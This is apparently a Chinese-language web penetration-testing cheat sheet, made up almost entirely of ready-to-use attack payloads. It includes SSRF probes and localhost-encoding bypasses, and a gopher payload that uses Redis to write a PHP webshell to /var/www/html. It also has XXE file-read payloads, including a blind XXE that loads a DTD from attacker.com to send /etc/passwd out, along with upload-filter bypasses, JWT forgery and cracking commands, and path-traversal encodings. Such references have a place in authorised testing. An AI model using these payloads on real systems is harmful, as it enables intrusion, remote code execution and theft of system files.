# Web安全专项

## SSRF利用

```
# 内网探测
http://127.0.0.1:8080/admin
http://192.168.1.1:3306
http://[::1]:80

# 协议利用
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_SET%20test%20123

# 绕过技巧
http://0x7f000001 (16进制)
http://2130706433 (10进制)
http://0177.0.0.1 (8进制)
http://127.1
http://0177.0.0.1
http://0x7f.0x0.0x0.0x1
http://0177.0.0.0x1
http://0177.0000.0000.0001
http://localhost:+80
http://0:80
http://[0:0:0:0:0:ffff:127.0.0.1]
http://0177.0.0.1:80

# DNS Rebinding
# 1. 设置TTL=0的DNS记录
# 2. 第一次解析到无害IP，第二次解析到内网IP
```

### SSRF到RCE
```bash
# Redis写WebShell
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<?php eval($_POST['cmd']); ?>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# FastCGI
gopher://127.0.0.1:9000/...FastCGI数据...

# 内网服务探测
http://127.0.0.1:3306 (MySQL)
http://127.0.0.1:6379 (Redis)
http://127.0.0.1:9200 (Elasticsearch)
http://127.0.0.1:27017 (MongoDB)
http://127.0.0.1:2375 (Docker API)
```

## 反序列化漏洞

- **Java**: ysoserial, JNDI注入
- **PHP**: phar://, __wakeup/__destruct
- **Python**: pickle.loads, __reduce__
- **.NET**: BinaryFormatter, ViewState

## XXE注入
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Blind XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>
```

## 文件上传绕过

```
# 后缀名绕过
.php → .php3, .php4, .php5, .phtml, .pht, .phps
.jsp → .jspx, .jspa, .jsw, .jsv
.asp → .asa, .cer, .cdx

# MIME类型绕过
Content-Type: image/jpeg

# 文件头绕过
GIF89a + PHP代码

# .htaccess绕过
AddType application/x-httpd-php .jpg

# 双重后缀
shell.php.jpg → Apache解析
shell.jpg.php → 某些配置

# 空字节截断
shell.php%00.jpg (PHP < 5.3.4)

# 竞争条件上传
上传 → 短暂存在 → 包含执行
```

## JWT攻击

```bash
# 弱密钥爆破
hashcat -m 16500 jwt.txt wordlist.txt
john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256

# 算法混淆 (RS256 → HS256)
# 将RSA公钥作为HMAC密钥签名

# None算法
# 修改header: {"alg":"none","typ":"JWT"}
# 删除签名部分

# JKU/JWK注入
# 指向攻击者控制的JWKS端点
```

## 目录遍历绕过

```
../
..\/
..%2f
%2e%2e/
%2e%2e%2f
..%00/
....//
..../
..\/
..%c0%af
..%c1%9c
```
